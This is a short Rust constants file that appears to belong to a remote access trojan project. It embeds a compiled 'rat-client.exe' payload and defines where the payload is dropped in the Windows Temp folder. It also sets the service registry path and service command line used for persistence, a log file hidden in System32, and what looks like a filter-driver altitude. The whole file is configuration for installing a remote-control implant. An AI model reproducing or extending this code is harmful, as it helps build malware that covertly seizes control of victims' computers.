use const_format::formatcp;
use rat_common::global::WINDOWS_SERVICE_NAME;
use widestring::{U16CStr, u16cstr};

pub const MAX_INITIALIZE_ATTEMPTS: usize = 50;
pub const SERVICE_REGISTRY: &U16CStr = u16cstr!(formatcp!(
    "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\{WINDOWS_SERVICE_NAME}"
));

pub const RAT_CLIENT_OBJ_PATH: &U16CStr =
    u16cstr!(formatcp!("\\SystemRoot\\Temp\\{WINDOWS_SERVICE_NAME}.exe"));
pub const RAT_CLIENT_SERVICE_PATH: &U16CStr = u16cstr!(formatcp!(
    "\"%SystemRoot%\\Temp\\{WINDOWS_SERVICE_NAME}.exe\" --host 127.0.0.1:12110 --log-path \"%SystemRoot%\\System32\\violet.log\" --scm"
));

pub const ALTITUDE: &U16CStr = u16cstr!("360000");

#[cfg(debug_assertions)]
pub const RAT_CLIENT: &[u8] = include_bytes!("../../target/debug/rat-client.exe");

#[cfg(not(debug_assertions))]
pub const RAT_CLIENT: &[u8] = include_bytes!("../../target/release/rat-client.exe");
